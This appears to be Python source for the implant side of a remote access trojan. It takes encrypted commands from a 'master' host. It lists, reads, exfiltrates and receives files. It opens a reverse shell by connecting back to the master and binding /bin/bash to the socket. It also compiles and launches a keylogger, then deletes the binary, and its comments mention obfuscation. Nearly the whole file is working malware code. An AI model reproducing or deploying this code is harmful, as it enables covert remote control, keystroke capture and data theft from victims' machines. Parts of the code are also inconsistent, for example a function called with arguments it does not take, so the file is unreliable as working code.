from sys import exit
from socket import socket, AF_INET, SOCK_STREAM
from socket import error as socket_error
from os import dup2, fork, listdir, getcwd, system
from subprocess import run, Popen, DEVNULL
from time import sleep


from .crypto import crypto_run


def reverse_shell():
    pid = fork()
    if pid == 0:
        pid2 = fork()
        if pid2 == 0:
            sh_conn = socket(AF_INET, SOCK_STREAM)
            sh_conn.connect((master_hostname, shell_port)) 
            dup2(sh_conn.fileno(),0) 
            dup2(sh_conn.fileno(),1) 
            dup2(sh_conn.fileno(),2) 
            run(["/bin/bash","-i"])
            # reborn(master_hostname, master_port)
    exit(0)

def compile_keylogger():
    pid = fork()
    if pid == 0:
        pid2 = fork()
        if pid2 == 0:
            # export cls="/usr/bin/gcc keylogger.c -o top"
            # code script to copy ove all c code on one file and obfuscate it as well
            system("gcc keylogger.c -o keylogger >/dev/null 2>&1")
            exit(0)
        exit(0)

def run_keylogger():
    pid = fork()
    if pid == 0:
        pid2 = fork()
        if pid2 == 0:
            # ./top
            sleep(2)
            system("./keylogger &")
            sleep(2)
            system("rm keylogger")
            exit(0)
        exit(0)


def send_res(conn, res):
    try:
        res = "ACK" + res
        encoded_res = res.encode("utf-8")
        encrypted_res = crypto_run("encrypt", encoded_res)
        conn.send(encrypted_res)
    except socket_error:
        # error sending data to master
        exit(0)
    return conn


def recv_cmd(conn, buffer):
    try:
        encrypted_cmd = conn.recv(buffer)
        encoded_cmd = crypto_run("decrypt", encrypted_cmd) 
        cmd = encoded_cmd.decode("utf-8")
        return conn, cmd
    except socket_error:
        # error connecting to master to recv data, reborn
        exit(0)


def cmd_shell(conn, master_hostname, master_port):
    while True:
        conn, cmd = recv_cmd(conn, 1024)
        res = ""

        if cmd[:2] == "ls":
            res = ""
            if len(cmd) > 2:
                path = cmd[3:]
            else:
                path = "."
            resp_list = listdir(path)
            for resp in resp_list:
                res += resp + "\n"

        elif cmd[:3] == "pwd":
            res = str(getcwd())

        elif cmd[:3] == "cat":
            data = ""
            try:
                with open(cmd[4:], "r") as fp:
                    data = fp.read()
                res += data
            except:
                res = "error opening file"

        elif cmd[:2] == "dl":
            filepath = cmd[3:]
            try:
                fp = open(filepath, "r")
            except:
                continue
            data = fp.read()
            fp.close()
            res = str(data)

        elif cmd[:2] == "pl":
            filename = "master_dl"
            conn, data = recv_cmd(conn, 64000)
            fp = open(filename, "w")
            fp.write(data)
            fp.close()

        elif cmd[:5] == "shell":
            shell_port = int(cmd[5:])
            sleep(1)
            reverse_shell(conn, master_hostname, shell_port)
        
        elif cmd[:6] == "keylog":
            compile_keylogger()
            run_keylogger()
            res = "[*] Started keylogging"
            conn = send_res(conn, res)
        else:
            res = "404could not find command"
            conn = send_res(conn, res)
                